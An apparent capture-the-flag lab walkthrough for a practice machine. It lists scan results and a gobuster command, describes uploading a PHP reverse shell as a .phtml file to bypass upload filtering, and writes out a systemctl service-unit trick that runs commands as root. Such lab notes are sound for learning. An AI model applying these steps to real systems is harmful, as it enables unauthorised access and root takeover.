<pre>
Machine IP: 10.10.231.156

Enum:
    Open ports:
        21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

Gobuster to http://10.10.231.156:3333/

gobuster dir --url http://10.10.231.156:3333/--wordlist /root/Documents/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt


And find http://10.10.231.156:3333/internal/ with upload page
Make a php reverse with name ex .phtml and upload it

Make netcat listener
And go find reverseshell at:
http://10.10.231.156:3333/internal/uploads/

Get user flag


https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf

Priv esc:

Creds:
user : genius


$eop=$(mktemp).service
$ echo '[Service]
> ExecStart=/bin/sh -c "cat /root/root.txt > tmp/output"
> [Install]
> WantedBy=multi-user.target' > $eop

$ /bin/systemctl link --now $eop
$ /bin/systemctl enable --now $eop

Cd ./tmp and got root
</pre>
